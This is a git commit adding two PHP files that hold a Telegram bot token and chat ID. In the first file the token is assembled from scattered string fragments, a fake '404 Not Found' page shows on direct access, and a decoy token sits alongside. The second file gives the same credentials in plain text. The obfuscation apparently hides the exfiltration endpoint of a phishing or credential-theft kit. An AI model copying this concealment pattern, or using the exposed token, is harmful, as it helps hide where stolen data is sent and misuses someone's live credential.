cab7f94574dd0e97ebb63e06978891519217a3c4
Livedave03 <lopelquelop@gmail.com>
2024-11-05 12:02:18 -0500

    Add files via upload

---
+++ data.php
@@ -0,0 +1,33 @@
+<?php
+ if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) {
+    header("HTTP/1.0 404 Not Found");
+    echo "<h1 style='font-size: 50px; color: red; text-align: center;'>404 Not Found</h1>";
+    exit;
+}
+
+ $a1 = "6012";
+$b2 = "tXy";  
+$c3 = "710";
+$d4 = "332:";
+$e5 = "AAHS";
+$f6 = "dyZO";
+$g7 = "fseS";
+$h8 = "NJ-w";
+$i9 = "kI1q";
+$j0 = "hN0s";
+$k1 = "_V09";
+$l2 = "Gree";
+$m3 = "pNw";
+
+$token1 = $a1 . $c3 . $d4 . $e5 . $f6 . $g7 . $h8 . $i9 . $j0 . $k1 . $l2 . $m3;
+
+$x1 = "102";  
+$n2 = "-92";
+$o3 = "027";
+$p4 = "8377";
+
+$chatID1 = $n2 . $o3 . $p4;
+
+$tok = "987654321:FAKEtrapToken";
+$id = "123456789";
+?>
---
+++ php/data.php
@@ -0,0 +1,5 @@
+<?php
+// Token y chat ID del primer chat de Telegram
+$token1 = '6012710332:AAHSdyZOfseSNJ-wkI1qhN0s_V09GreepNw';
+$chatID1 = '-920278377';
+?>
